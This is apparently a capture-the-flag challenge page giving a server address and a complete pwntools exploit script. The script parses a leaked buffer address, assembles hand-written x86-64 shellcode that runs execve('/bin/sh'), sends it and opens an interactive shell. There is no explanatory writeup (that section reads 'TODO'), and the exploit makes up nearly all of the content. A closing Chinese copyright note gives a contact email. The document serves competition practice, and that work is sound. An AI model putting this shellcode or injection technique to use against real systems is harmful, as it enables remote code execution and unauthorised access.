#### Goals
 * Try to find the flag

#### Server Address
 * nc pwn.sniperoj.com 20006
 
#### Solution
```python
#!/usr/bin/env python

from pwn import *

context(os='linux', arch='amd64', log_level='debug')

if len(sys.argv) == 3:
    host = sys.argv[1]
    port = int(sys.argv[2])
    Io = remote(host, port)
else:
    Io = process("./pwn")

# read buffer addr
Io.readline()
addr_data = Io.readline()
addr = int(addr_data.split("[")[1].split("]")[0][2:], 16)
Io.readline()

# machine code
xor_esi_esi = "\x31\xf6"
mul_esi = "\xf7\xe6"
mov_rdi_bin_sh_addr = "\x48\xbf" + p64(addr)
mov_al_59 = "\xb0\x3b"
syscall = "\x0f\x05"
jmp_short_8 = "\xeb\x08"

# build payload
bin_sh = "/bin/sh\x00"
shellcode_addr = p64(addr + len(bin_sh))
payload = bin_sh + xor_esi_esi + mul_esi + mov_rdi_bin_sh_addr + jmp_short_8 + shellcode_addr + mov_al_59 + syscall

print "[+] Payload Length : [%d]" % (len(payload))

# send payload
Io.send(payload)

# get shell
Io.interactive()
```

#### Writeups
 * TODO

## 版权

该题目复现环境尚未取得主办方及出题人相关授权，如果侵权，请联系本人删除（wangyihanger@gmail.com）
